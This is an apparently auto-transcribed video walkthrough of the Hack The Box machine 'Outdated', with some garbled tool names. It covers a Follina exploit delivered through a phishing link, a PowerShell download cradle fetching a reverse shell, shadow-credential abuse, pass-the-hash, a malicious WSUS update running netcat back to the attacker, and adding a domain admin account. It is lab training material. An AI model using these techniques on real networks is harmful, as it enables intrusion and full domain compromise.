 what's going on YouTube this is ipsag I'm doing outdated from hack the box which is a really fun box that featured three steps and the first one is a little bit tricky because it is using the Felina exploit but if you Google Felina it's mainly based upon Word documents and creating phishing payloads the Felina exploit itself was just internally how Windows rendered web pages so you don't send a malicious Word document and said you send a URL that just directs the computer to your server that serves the Felina exploit that gets you a shell on the box what's on the box you can run Bloodhound and decide that you have the add credential link to a different user which is the shadow credential exploit or not exploit but technique right so you just configure that user account to allow authorization via SSL certificate so you can log in as them without changing their password once you get on the box as that user your wsus admin so you can create a malicious Windows update package push it and get code execution as root so with that being said let's jump in as always we start with the end map so Dash SC for default scripts as V enumerate versions OA output all formats put in the nmap director and call it outdated and then the IP address of 10 10 11.175 this can take some time to run so I've already ran it looking at the results we see about 12 ports open the first one being SMTP on Port 25 and its Banner tells us its hmail server which is just an free SMTP server I guess we do have mail.outdata.htb so let's add this into a host file so sudo VI etsyhost and we'll start fixing this up so 10 10 11 175 add this hostname I'm also going to add outdated and out data.htb the next thing we have is domain that's on Port 53 so that's just DNS we have Kerberos it's telling us the server time so if we ever do any type of Kerberos things we should make sure our time matches up and then we have all the standard active directory ports So like um ldap 445 is also open the one thing that's odd is we don't have any web servers I'm like looking around Port 80 would be between here it's not there 443 should be between ldap and SMB and I don't see anything on like 8080 so there is no web server that being said I'm going to test out just um crack map exact against this so crack map exact SMB 10 10 11 175 and the reason why I'm starting here is SMB is probably the quickest place to poke at first because there's not many tests right so we can see we can connect uh we do have server signing set to True SMB V1 set to false its Hearth name which is DC so we could go and add that to our host file um I actually have it down here so DC dot outdated.hdb uh casing doesn't matter for that so that's fine um we could try null authentication so Dash U with nothing Dash p with nothing and see what happens here um we may have to add dash dash share to see if there's any valid shares on this box and we get access denied and this is going to be one of those weird things in pen testing that I think is often wrong and I've also probably added to that because What's Happening Here is on like Anonymous authentication I think so I haven't put any username here that doesn't exist we get a success and we can enumerate the share so right now um you think this authentication would fail but the user doesn't exist and I think Windows defaults to Anonymous after that it's definitely not guessed because if we do guest foreign we're going to get access tonight as well because this is a valid user on the box right so out there to guest and we should see access denied in a second where is it um it worked that's not what I expected um I'm gonna go to SMB client real quick so if we just do SMB client Dash L Dash N Dash l 10 10 11 175 this is why a lot of people call this null authentication because they think the dash n stands for null right that makes sense that's what pen testers say but if we look at it uh dash n is where is it no pass so it doesn't mean anything with null authentication what happened here is if we open up Wireshark we can see exactly so I'm just going to do pseudo-wire shark ton zero do this same thing and we're going to look at it in Wireshark we see it's authenticating with work group ipsec it took my username so this is not null authentication this is just um I guess it's assuming um Anonymous authentication is what I think if we put you as equal to nothing this would be null because a null goes into the username field right so if we see user is just work group there's nothing after this and here we get access denied right um if we do guest here it's actually I think going to give us a login failure as well so I don't know why crack map exec did not but this did so now that I'm intercepting this let's just see what happens so in this where I did guest we have work group guest and that went to log and failure right we see that what happens with crack map exactly I have no idea why um sometimes when doing the videos I do learn things right um that's the benefit of slowing down so we authenticated and it's doing smb3 so it's encrypted where is gonna be did outdate a guest see this is it I believe that is bizarre um let's stop this real quick and restart that Gazette I just want to make sure I was going with the right one so we did Dash you guessed I should be able to kill this off now we've already authenticated um let's see where is that packet it's before this encrypted session log off so one thing I'm noticing is Gap map exec which uses M packet sends a lot more so we authenticated with user setup response log off so eyeballing this I don't see guest ever get sent I'm not sure what happened but it's not really relevant to this box maybe something you want to dig into um these are just the type of pads I go down as I'm doing boxes to figure out my tooling I don't know why crack map exact guest is different than that but we can enumerate chairs with invalid usernames that's the takeaway right um hopefully you enjoyed that rabbit hole I'm now at a slight loss for words because I don't know what to explain but that happens Windows SMB is weird we'll just leave it at that and once this enumerates all the shares we know there's going to be a non-default share that we can read right we have shares and read access here so what I'm going to do is SMB client dash n for no password Dash U will do a user that doesn't exist so please subscribe and then 10 10 11 175 slash shares to see what file is here right so I can do a dir a I think will show uh maybe slash a uh Dr slash question mark I don't know I was looking for a way to show hidden files um I don't think there are any we have this knock reminder.pdf so we should try to download it um I think FTP has like a dash a for all files I'm guessing SMB client does not but we downloaded the knock reminder.pdf so let's go open it and see what is here so this is talking about a outage and it's saying email this email right and it wants internal web applications so what I'm going to do is use walks to send an email to this and then we're going to take a look at these cves right so swaps if you don't know um I was hoping to get like help the Swiss army knife SMTP client is what it is but it makes it really easy just to send basic emails so I'm going to add the dash 2 we're going to say itsupport outdated.hdb because that is what is here and then we'll do Dash Dash from I'll say root at ipsec.rocks dash dash server uh mail.outdata.hdb we could also use the IP address but it's in our host file so it doesn't matter um the body of the mail address and it wanted a uh what was it a link to a um web application right so we'll just give it HTTP 10 10 11 14 8 which is my IP address and then we'll add the header of a subject message and just say internal web app request I don't know if we need to add a subject or not but whenever sending emails probably should right I'm going to set up a netcat listener because the main thing I want to see is if anyone clicks this link and then when they do I want to see what the server header is so now that that's sent let's go and do some research on these cves right um there's this cve 2022 30190 so if I go to Google and search for this we will find out this is going to be the um bolina exploit this isn't a good summary of it it's talking about msdt which is one of the protocols we exploit but I don't see many references to the special name Felina so if we look uh logarithm and this is going to be how we start knowing it is going to be the Felina exploit now the odd thing about this box is most people think of Felina they think of Word documents and that's common because that's the way this was mainly weaponized but it's how Microsoft internally processes um links and they just use a method in word to make word reach out to a link and then exploit it right it's not exploitable via like Edge because Edge has its own sandboxes and all those type of protection Technologies around it but Microsoft Office still uses just raw Internet Explorer that doesn't have as many mitigating things built in so that's why it was heavily weaponized with um word and I say that because now that we see the server header that reached out to us when sending this email we see it's Windows Powershell and if we take a look at the actual script which we may do at like the Beyond root section all it's doing is an invoke web request to a URL and it actually ends up being exploitable by ferlina because it's just a headless thing making a request that doesn't have any protections built in right so how do we know this is going to be vulnerable well looking at the user agent we see Windows Powershell and then also see this version string um I'm not 100 positive what this means but I'm guessing it's Powershell version 5.1 I know 19041 this is going to be a internal Windows build number so that's like the major release of um Windows 7 Windows 10 probably or something and then 906 is the minor release so if I just Google 19041 906 and this is what you should be getting in the habit of being able to just see these um versions and guess what the numbers mean right and that's something that just comes with experience we can see based upon this page this is going to be a KB article from March 29 2021. if we look at Felina when this cve came out I think it was June of 2021. um let's go back to this let's see the Microsoft bulletin this will be a good page for it right because this is when it hit the public uh let's see where is a date executive summary yes so installing the June updates so last I checked um March is before June so chances are this Powershell is not updated right so if we do the Felina exploit here we may get a shell so let's test that out real quick I'm going to Google Felina GitHub and the trick here is going to be getting an exploit that um is not in a Word document so if we look at this this file this Belina dot Pi um goes in and creates this HTML template and I don't know exactly why we need a bunch of junk in the index I just know we do specifically you need like 4096 bytes before the actual payload um not sure exactly why it's probably some weird antivirus thing right that it only scans the first 4096 and after that um then it works I'm not sure but that makes sense in my mind and you saw here this is where the exploit goes It's just in like a templating language I guess it's not a real template because it just treats this as a variable but for any web developer that's how you would reference a template and code so if we look at what payload is if we go to felina.pi um let's see in command it's setting this payload it's going to be Ms msdt then PWC the pcw diagnostic Skip and that gives us a bunch of things and does invoke expression to um I guess base64 here right so this was a long way of saying I just want to run this script with the command and give it a command to execute code so let's do a get clone I think that's on my clipboard it's not anymore so let's grab for Lina dot pi and we can go here then when we execute bolina.pi we want to probably give it Dash m command type this doesn't matter we'll just give it RTF um Dash C and this is going to be what we want right I'm going to say IEX new object net.web client download string HTTP 10 10 14 8 Shell dot PS1 so if I run this what happens uh we get a permission died so let's run it with sudo and we see localhost exploit.html so if I look at this look at the source we see now where that payload was it's replaced with that um link right so I'm going to copy this and let's just make a directory dub dub dub go in here curl to download it I'm just going to save it as index.html and now we have the ferlina exploit as index and it's making people execute shell.ps1 so we should put a shell here um what I like using is Con PTY shell for Windows and the main reason I like doing this is it gives us a fully interactive reverse shell so we have tab autocomplete I can't tell you how much I love having tab autocomplete on my reverse shells so I'm just going to copy this so vshow.ps1 set paste paste it in and then the instruction it gives us is generally it wants us to invoke web requests and then execute a command afterwards I just like putting the command at the end of the PS1 file so if it ever loads this it will send it we'll do 9001 10 10 14 8. which is my IP address and then the last thing it wants is an stty thing and I'm making this its own pain intentionally because before doing this NC command to listen on the port we're doing some sdty stuff to send it right and if I do it in a small window in tmux when my reverse shell gets sent and I expand the shell my terminal is going to be all wonky right so whenever using com PTY shell I just like doing um it and its own pain so now I should be able to do python3 acp.server on Port 80. um let's see I forgot the dash M for module and now I'm going to use the uh not Felina exploit we're gonna go and use swax to send this same exact email again I'm going to clear the screen just so it's cleaner and now this time when Powershell reaches out to us it's going to download the index.html which has the Felina exploit and the Felina is going to redirect it to the Powershell thing to give us the reverse shell um hopefully this works if not then we have some debugging to do which honestly I don't know how I would approach debugging this so we're just going to pray it works the first time you should get this to hit within like a minute if you don't then try sending the email again and after two or three times that's when I would um see what I'm doing here one thing I know from playing this box previously is if you send things that end like test.doc I think the hmail server thinks this is Spam and will never click it so you can't send it documents um but you can just send it links I'm just going to send this one more time to hope it works and I'm gonna pause the video we'll resume once we see it getting shells there we go we do have hit slash but it did not follow and hit or exploit which is my worst case right so we have to look at our web server real quick so go NW dub V index.html and see what is happening here right so it did from base64 string and then we have all of this my first guess is I screwed up some base64. all right screwed up my IEX command um looking at it still did not hit send it again while we take a look so cat www index and let's copy and paste this to see what we have so Echo dash n 64 Dash D IX new object net.web client IX new object net web client download string think this looks valid so I'm not sure exactly what is screwed up um we're just going to try it to get a another hit to make sure um it works Felina isn't always the most reliable exploit so maybe it'll work the second time right that's going to be the hope and if it doesn't um more debugging I guess and there we go we have a hit on slash and there we go it hit shell this time I'm not exactly sure what happened but honestly nothing changed on my files so this web uh this exploit is just a little bit unstable but if it doesn't work the first time always try it again and here we go we have a reverse shell on this box if I look at who am I I'm the user B tables oddly enough I'm like in this weird app data directory right but if I go all the way up and look at this go in desktop there isn't a flag here right I'm going to do di right here uh there is Windows Powershell scripts is there anything here um nothing there so let's look at just users and there is an administrator user on this box also if I ran instead of doing System Info first let's do ipconfig I see my IP address is 172 16 2020 which is weird I would expect to be on the 1010 Network right so if I do system info is going to get a list of information about this box right and the first thing I notice is my network card is Microsoft hyper-v so I'm actually in a uh VM well I'm in a VM because it's hack the box but I'm in a nested VM this is a VM in a VM um I'm not used to seeing the hyper-v network adapter I think it's like Microsoft E1000 potentially um we'll take a look when we pop this box at system info to see what the Nick is but I don't think hyper-v is common in VMware boxes which is normal in hack the Box um also if we look we can see let's see is there anything else that says hyper-v uh Windows 10 Enterprise and virtual x64 AMD so it's a single processor that's also like indication um you're in a VM if you only see one processor because of hyper threading you normally see multiple right so if you're writing software and you want to detect VM that's a common one um hypervisor has been detected so I'm guessing it's mainly just the neck that is the uh giveaway right if I do her's name my host name is client so the next thing I'd probably run is like an ipconfig all to see the uh DNS servers that's 172 1620.1 so we could run nslookup and see if it works in this shell it looks like it does 20.1 to see what this IP address is if it responds to us it doesn't um let's see we're going to query it for 127.001 we don't get anything so not much we can do with Ms lookup real quick if I do it who am I slash all this is gonna get all our information and this is going to be what tells us we're part of a domain right if you ran this on your computer it'd be like since this hostname is client I think it would say client slash B tables right the host name of the box or maybe we'll just say B tables and you wouldn't even get a full Sid not exactly sure what we get um but my computer on my desktop is not domain joined so let's see right so I'm going to do who am I slash all and this is just my regular pc my host name is BLD so I was right about that you do get a sid let's see what is that Sid is that gonna say something easily identified um I don't think so maybe this is I don't know I don't know enough talk about SIDS but um if this was client B tables I know I'm not in the domain but since I'm in a domain um we'd probably want to try getting this password right uh the password itself is not crackable so um it's not going to really help us that much but I would show how to get hashes right so if I do responder pseudo responder right dash I ton zero oh shoot um I forgot responders hosed on this box let's see give me one second python three nine I want to say responder dot Pi Dash I ton zero I think this will work there we go so now my box is listening on Port 445 all I would do is like um get content item 10 10 11 or 10 10 14 8. try to get something off the share and we get the hash um this isn't crackable so I'm not even going to try but if I'm doing an engagement that's the very first thing I would do because if I get kicked off this box maybe I can spend a lot more time trying to crack this if I'm on an engagement right always want to get some type of information so um I guess I would run um Bloodhound at this point and since I don't have the cadentials um the easiest way to run Bloodhound is just um through.net so let's see um I think a sharp collection GitHub yes this thing GitHub playing big but I always mispronounce his name um I don't know how to pronounce it but this GitHub repository and we already have it installed so if I go to shark collection do a get pull um the key thing to be let's see if it says it here um let's see Sharp pound right so we can see on this list sharp pound isn't being updated anymore for four oh and four five it's still going to exist in these directories but it's not going to be an updated version so if you ran the four five one four five Bloodhound version um and you're in the most up-to-date version of Bloodhound right now when you go to import the results it's going to tell you some version mismatch so you want to use the one on.net47 um otherwise when you import it you have errors I also don't really know the difference between any x64 and x86 because.net doesn't really have architecture but you can still compile it for an architecture it's weird um I always choose any and never have any issues if I choose like x64 sometimes I'll have an issue so um I always get in the habit of choosing any so let's go NW dub and copy shop pound here right so copy sharphound.exe hdb outdated we have it here and now I can just go to like program data and do a curl 10 10 14 8 sharphound.exe out file sharp pound dot EXE and this works because my reverse shell is a Powershell and it's a new version of Powershell so it has the curl Alias built in shutdown.exe so let's do short pound.exe Dash C all to do all collections and then while this runs I'm going to make a directory SMB and we're going to start an impacket SMB server and we can see this version of SharePoint is compatible with 4-2 release of Bloodhound um if we did the 4.5 version .net 4.5 version before that one release of Bloodhound if you try to import that into the latest it errors um only reason I'm spending so much time harping on that because I spent like an hour and a half debugging that issue to realize I was on the wrong version of shut pound so let's do pseudo impacket SMB server um let's see we want to specify SMB to support and then the share name I'm going to call it share and then the path I want to share out is the current working directory so none there I should be able to just copy um let's see this zip file which is the Bloodhound thing 2 10 10 14 8 slash share and we see it copying over so it is now done um I'm going to delete this file so let's delete it I should also stop this share immediately and out of habit I'm copying the sensitive file out of this because if I didn't do this instead of the SMB server back up anyone that just does an SMB scan would see that file and that'd be potentially a security issue right so I always try to keep my SMB directories clean when I do file transfers um let's see sudo we gotta start near 4J now because we're going to um run bloodhound so now that that's running we can go to opt uh let's see I'm gonna download the latest version of bloodhound GitHub bloodhound here let's see there should be a releases what is Linux not um this one I want copy link wget actually opt see I have a bloodhound thing here already Bloodhound here we go so unzip Bloodhound Linux x64 and we should be able to execute bloodhound log in with our neo4j credentials and we'll upload the collection uploading data it says complete so this is all good so once this finishes we could just do the analysis and my very first one is find all domain admins just to make sure we have data and we can see administrator does exist so first thing I do is search b tables because that's the user we have access to and we select him right click Mark is owned then we go to analysis and shortest path owned principles and we can see a weird path so B tables at outdated is a member of IT staff i t staff has this um oh man I zoom in and the text isn't changing it's add key credential link to s Flowers and S flowers can Powershell remote to dc.outdata.htb so if I right click on this add credential link Edge and click help it tells us and this is going to be a shadow credentials thing if we click on abuse info it wants us to run whisker with the command slash add Target and the target principle so I'm going to Google invoke whisker because generally that's what um Windows things are called we could also look for wisco.exe but if I do invoke whisker I'll probably find some Powershell script to just load it quickly um so if I look at this invoke whisker.ps1 out of PowerShot pack and there is a binary here so let's go back to our shell go in dub dub dub W get invoke whisker and I don't know why it resolves to IPv6 sometimes on wget I'm just going to call it wisco.ps1 set mode uh paste and paste this in there we go so now all I have to do is an IX so IX new object net.web client download what if I have tab autocomplete I do not that that saved me any time because there's a lot of downloaded strength uh download stuff but we can download this string HTTP 10 10 14 8. I called it whisker.ps1 I believe so we do that and that's the wrong quote oh God uh can I control c i can I love this reverse shell uh console PTY is amazing they're a con PTY shell that's the name of it but download the string and now I should have invoke whisker I do tab autocomplete confirms that so we go to Bloodhound we want add slash Target and then was it s flowers or S flower s Flowers let's see oh um invoke whisker if I look at the code um it wants a parameter called command so we can do Dash command and add it so if we look at all this output we see it generate a certificate to do the shadow credentials attack and says we can now run rubius with the following syntax so this is a lot of text and it can easily get lost I'm going to copy it on my machine to a note right so we copy this v rubyus s flower dot text it in so at least we have it and the one thing I want is this password so I'm going to try just evil winner M real quick when RM dash i 10 10 11 175 Dash u s Flowers um I wonder if I can specify a domain like this Dash p don't put this password in and we'll see what happens here I think it's going to give me access denied but it may not let's see come on establish the connection it's not the fastest thing and there we go it failed and if we looked more into it um we know it failed because the password is not the password for the account it's the password for this certificate um I'm not 100 positive on the shadow credential attack but for my understanding you're adding a SSL certificate to an account to be able to send act as a secondary authentication mechanism so um we're just authenticating to this user via certificate it's a different form of password um I copied that rubies thing again because the next step we want to do is upload rubius to the box so we can run the command because if you looked at it it's running the rubius with the ask for TGT so it's probably going to return a ticket granting ticket for that user right so let's go back to a www directory and copy from sharp collection rubius um uh let's see NET Framework for seven any rubius.exe copy it here go back to the reverse shell curl 10 10 14 8. rubebs.exe Dash o obius.exe and then we'll just execute what it tells us to um when I copied this it went all on separate lines shoot let's see I'm going to vrubious dot text or what do we call it Ruby s Flowers so we want to remove all these line breaks so we'll do the lazy way of just hitting home and backspace 30 times um and hope this gets everything on one line and we'll copy it outside of teammux to see if this works better I'm guessing that Khan PTY shell screwed up my copy and paste is what I had to guess so dot backslash paste it and that looks hmm looked better for a second try it again there we go this looks like it's doing it asking TGT looks like it authenticated let's see it's giving it time and there we go we have a ticket and it also gives us the ntlm hash for this account so if I went back to this command and we replaced the S flowers with the dash h and try logging in with this hash um I believe it will work yep it did so we know how we specified the username here and password was a valid way right but now we have Eva win our M shell and if I do a hostname we are now on the DC and whenever I get a new user I always like examining who am I slash all because it tells us information about the user um the username and said not too interesting to us the main thing that is interesting is going to be the groups and or the tokens right so we see that everyone group the Remote Management users these are all default groups I gently glance over the default groups and turn my eye towards the ones that have a longer Sid and wsus administrator this is going to be a default group to Windows update services but since it's a longer set it means this domain was or this group was probably created after active directory because you installed wsus right so we're a member of wsus Administrators which leads towards this attack I do want to install or run winpies real quick against this host just to see if it highlights this group I know Bloodhound doesn't oddly enough so let's just download the latest version of winpies real quick and then we'll show the Bloodhound output for this user while this runs so here latest release let's do win peas any this looks good um let's save the file go to a dub dub dub downloads is it lowercase win peas yep so we can download it there and we'll just run it on this box right say we don't want the reverse shell we want it here we'll go into program data and then curl 10 10 14 8. winpies any download it execute and while that runs we can look at bloodhound and set now s Flowers to be owned and if we do analysis shortest path from owned principles whoops is that what I want to do show us path and principles there we go as flowers and still just tells us we can remote into the server it's not picking up anything about the um wsus group right we can look at first degree group memberships to see what groups we're a part of domain user wsus administrator Remote Management so it does pick up this group it just doesn't have any information on this exploit path that we're going to do um looking at this we search for wsus it's not highlighting wsus administrators and red so it's guessing um nothing too interesting it does tell us that use WSS server so we can it points us towards these exploits right so maybe these are the same thing see I actually did not see this what is this going to do so this is a man in the middle to inject an update so we're essentially going to be doing this but we're not going to do the man in the middle piece um so what wsus is picking up on here and this is all going to be a guess because they're not prepared for this but it sees the end point is HTTP and it is using that wsus so because this endpoint is HTTP if we man the middle it we can replace the binary with things and since this is saying man the middle that's going to be it right wsus should be on https but because we're a member of the administrator group we're not doing any fancy um man in the middling here right so this exploits saying a computer tries to update your man the Milling the connection it goes to download this update or download the cabinet of updates and your computer says you have this update to download Go download and run the code right and that's how possible because it's plain text what we're going to do is just create a malicious update and because we're a member of the administrator and have the permission to create the update we don't have to do any man in the middling so I'm guessing that was um it and when peace isn't going to tell us anything more about wsus oh shoot I just closed winrl oh well we'll reopen it so I like using a tool called sharp wsus for this um technique so if we go here they have a blog post and the key thing about when doing this this attack is the um binary you use with wsus has to be signed from Microsoft and this may sound like it's a hard thing to do but I mean it's any living off the land binary and CIS internals is signed with Microsoft right so if we go down here and look we'll see this is using the PS exec binary and then they're just using it to add a user so let us download Chuck wsus and there's no compiled binary and I know this isn't part of the sharp Collection Pack so we just should compile it ourselves I'm going to move over to a Windows machine so we can download this and compile it with Visual Studio so just copy it here open it up and then we just change this to be any and this to be x64. um sure we can upgrade to 4.8 and hope it comes is compatible with the machine um hopefully it is I'm actually not sure um I know this is the latest version of Visual Studio code so there's always a chance that Visual Studio 4.8 isn't available on that host and it'll have to do something to download the uh 4.7 version so going here uh I wonder if that's this um it probably is let's just turn Defender off so let's see yeah wsus so manage settings real-time protection off come on Defender stop complaining so we'll copy this and then paste which isn't there um let's see if this works okay I dragged it from another window and we have it so I'm going to copy it in dub dub dub and then we can download it right so let's go come on CD slash program beta this is not the most fast shell but curl 10 10 14 8 sure wsus.exe and let's see if it downloads fine here try to execute it dir it's there I guess we just don't have tab autocomplete and Evo when RM and running it it looks like it works so um so that's good I was worried that it just wouldn't run because of.net 4.8 so we can see this all works we can do inspect and it pretty much gives instructions on how to do it right we just need to upload PS exec.exe and give it these arguments and approve everything so let's go PS exec sis internals and download this version and we have to use this version because this is going to be signed for Microsoft right um so let's save PS tools and let's see CD downloads or CD www move downloads PS tools unzip PS tools and we have PS exact 64.exe so that's what I'm going to copy so we'll do CP or not copy uh curl 10 10 14 8. PS exact 64.exe to PS exec.exe do a dir we have it so let's see let's do that shut wsus command again so we can see what we have to do which if you understand wsus it should be relatively self-explanatory but I don't think I've done a good job really covering wsus so this is like Windows service update server I believe and most places probably don't even utilize these they just use Microsoft's default wsus server but large organizations have the ability to stand up their own Windows update server and other workstation check-in and the benefit to this is you have the WSS server you can decide which patches get deployed because every now and then Patch Tuesday does Brick a lot of operating systems or computers so you have the ability to stand up your own wsos and decide which updates your computer's install additionally what this does is save on a lot of bandwidth because let's say even office it has 200 computers in it and 200 decide to download the Microsoft update at the same time you're going to have a lot of bandwidth issues there's like a thing called Branch cache and peer-to-peer that Windows does every now and then to speed that up up but in most cases the olden times they all go to Microsoft and you like have slow internet so you'd stand up a wsus server at your branch so all the computers went to that update service right so what this command is going to do is create a malicious update and that's why we have to have a Microsoft sign thing because wsr servers natively treat Microsoft sign things as non-malicious so we're going to copy the command up to this point so dot slash sharp wsus and then we're going to change the payload because it's actually in C colon backslash program data backslash PS exec.exe and then these arguments are not valid well update the date uh Dash D is right but we don't want to run who am I and write it to Sequel and text Dot text we want to instead run it to Let's see we got after d so grab this and give it the title and I'm going to give it a meaningful title we'll call this local admin update I guess right because this is adding the user wsus demo with the password of password123 bang and then adding him to local administrators group so if the computer does install this update um we should get a local admin and it looks like it does not like it because of those ampersands so let's try escaping them so if I just do a backslash here uh still does not like it we could try to instead of escaping them maybe put these as single quotes I'm guessing this doesn't work because otherwise um it would have done that right so that's a single quote and this is a single quote let's try this uh unhandled exception because I'm guessing this payload does not exist PS exec.exe so it looks like we have um added it so what this did is go in the WSS server and create this update so what we have to do next is approve it and we got the ID here so I'm going to do um first a host name I think it was DC it is so we can do wsus with the update ID and then slash computer Name DC dot outdated.htb it wants the fqdn which is fully qualified domain group and then the group uh what did we call this uh let's go up to look at what group we did um let's see add where's our Command I'm based upon the way this looks in my tmux um I don't think it worked like it's got this Ampersand like what I don't know what that is but maybe it's some weird just encoding that um it did so I think group name we just do this right and now we have approved it so what this did is approve the update local admin update to this DC right so now what we want to do is instead of the approve we want to run check and what check's going to do is tell us if it is installed or not and this one said cannot be found I wonder if we need this cannot be found how do we run check delete check update ID what this should have worked right well that doesn't sound the period update is not installed okay so it's probably going to take probably somewhere between three to five minutes I would think to install it but if it does install correctly it'll say update is installed and we Run net user we should see the user um wsus admin was it what was it hostname create yeah wsus demo is the user we should see if this installs successfully so it's not there yet let's run the check again update is installed but we don't have it and keep in mind when I did this I mentioned um there's probably some special characters here that this command does not like so what we should do instead is simplify this because I always say when you have a complicated payload and it doesn't work why don't you just make it less complicated right so I'm going to get rid of this whole CMD thing and what we're going to do instead is say let's execute C colon uh program data nc.exe CMD and will send it to me on Port 9001 so we have to put netcat in this directory so I'm going to call this one rev shell and I can create this and it's not going to get sent to install until we do the approve command so I'm not on like any type of race to get netcat on this box right now so let's go copy outdated netcat 64. so CP to nc.exe uh to here cannot stat I guess that doesn't exist anymore um we'll do real too okay that one works if you didn't know the locate command is like a quicker version of the find but it depends on the database like M locate.db which I don't know where it is um and VAR lib I'm locate so it depends on this database and that gets updated whenever you do update DB so I'm guessing um my database was just out of date and it was telling me nc.exe existed in a directory that no longer exists on my box but we copied it now so 10 10 14 8 nc.exe O n c dot EXE uh not found alas uh let's move nc64.exe and cexe there we go so now I have netcat here so we ran this command to create a malicious update that sends a reverse shell to us so we should listen on 9001 and since it's windows I always like using rlap I guess we could have done like a Powershell con PTY shell but the reason I'm not doing that one again even though we knew it worked from earlier is that involves Powershell a lot of special characters and I want to get rid of any type of complexity so that's why I'm just defaulting to a regular shell um what we have to do is go and get the update ID to approve it so let's see I'm going to copy this we can go to the previous approval and all we want to do is replace this update ID with our new one so now on the wsus server there is failed a Target group oh um we didn't name this one so rev shell I think is what we called it one word let's go up the group name local admin update yes rev Shell One words there we go now we have approved it so when this one gets installed we should get a reverse shell back so I can get rid of the group name just do a check and update is not installed so whenever the wsus server checks into or the wsus agent checks into the server it'll say hey there's one update approved for us to install and it should go install this right I'm just going to check net user again to make sure we don't have a wsus demo user I think it's just because of some weird bad character in that argument so still not installed I'm going to pause the video and we will check in like probably a minute or two oh wait I'd even have to pause it so you saw me run it it said not installed there did it again as we got the shell and here we are so if I do CD backslash users we will have the administrator user that we can get into because we are anti-authority system right so we can go in desktop and get root dot text so hope you guys enjoyed that attack it's kind of a weird attack I think in this because I've never seen a user be added to the wsus administrator group and not be a member of domain admins anyways generally on wsus attacks it's going to work with a man in the Middle where they have HTTP as the wsus server but this was I think 2015 when that attack started coming out it's 2022 now so like seven years later um I want to say It's relatively rare to see wsus on HTTP and not https so it's a fun attack fun lateral movement but not really um something you can really abuse easily right that's why you probably haven't heard of this attack just because um it's edge cases but every now and then there is that edge case that you do land on it and you're happy right so um I'm guessing that's why also the attack isn't a bloodhound because edge cases anyways I hope you enjoyed the box that's probably going to be most of the video um I want to try enabling remote desktop and running through the attack looking at the wsus admin panel but I'm not actually positive that's installed in this box so um let's just enable remote desktop because I don't think that was installed and to do that we just edit the registry so um I should have had this drop me into a Powershell prompt not uh CMD prompts but you live in Lakeland so I think this is the name we do and then it's uh F deny TS connections I did a single quote there Dash value zero so we're telling it not to deny connections didn't error on us so now if I do nczv uh 10 10 11 175 I want to say this box was 338.9 if we do 445 does it connect next there not on that um let's try Powershell Dash command enable net firewall rule display group remote desktop and we should do that in single quotes ws389 sweet we do awesome um net user ipsec password one slash add net user local administrator ipsec slash add oh wait it's net group I think administrators is it local administrator net group net group domain admins hip SEC ad there we go and our password one so if I do x free RDP slash f for full screen V I don't know why it's V but that's IP address um u ipsec p do we login awesome so now we're a remote desktop into this box I want to say control or enter oh that's going to script my hockey um probably should have done a different resolution let's just see if wsus is on this right because I don't know how to put this in a window it's a control yeah we'll play with the resolution after we get wsus open so let's go manage servers it's been so long since I did this but I'm guessing wsus is gonna pop up here and we'll have the pain right come on this is going slow I wonder if I can do it quicker this way MMC yes Ctrl M to add remove snap in come on Ctrl m W sus sweet uh uh Windows Server backup update server this is it so add it's taking its sweet time sweet so this is how you would add a or manage a wsus server we're in the administration panel right now so we can see all updates and I bet if we do all updates we're going to see like a reverse shell and things like that um right now we don't because it's unapproved but if we sort this by approved status any refresh show me the updates I don't know why it's not any except declined show me the updates well we have um things here oddly enough like I'm not saying the package let's do any refresh so this is showing the computer in this so these are the two groups I did and the shop W sauce creates a computer group to add which targets are in it right so this is the local admin update we did if this ever um decides to load it should show the DC here but this is what tells it to actually install but I'm not sure why we don't see the updates here loading updates 100 it's done if we do any any refresh so what I'm going to do is create an update and then we're going to check this console to see if one comes up but I'm just going to disconnect get rid of the slash F so it's just in a window and then we can do the update here let's check approve create so I'm going to create rev shell too so it says it has been created now if I go here there should be a way to find this update but I don't see it so this may be a failed Beyond route Downstream servers refresh see options what are these that's not it it's definitely got to be this unapproved any there we go so we can see the update here um I don't know why we can't view it I guess we're missing some type of package but if we approve it here it will send us the reverse shell um that's pretty much doing the same thing here I think the difference being when we approve it in this it's also going to approve it to a group which this one does not do but if I change this to install or is it approve rev shell 2 or just to change the update ID and then it's going to probably go into no man's land where we can't see it okay it's been approved we refresh we no longer see it refresh here oh we see it here so um it's waiting to be sent out I bet if I somehow refresh this we'll see a REV shell 2 group there we go and if we look any status any we see DC updated it says One update has not been installed let's see let's see lvnp 9001 move it over here and as soon as we get the shell you'll see it install here but um yeah it just takes a while for the check-in to happen I hope this is beneficial seeing exactly what wsus is but there we go um it's there going to refresh installed it no longer has the arrow um this is a janky installed wsus but wsus is always going to be janky approved is gone it's just not in here anymore which is odd but yeah hope you guys enjoyed the video take care and I will see you all next week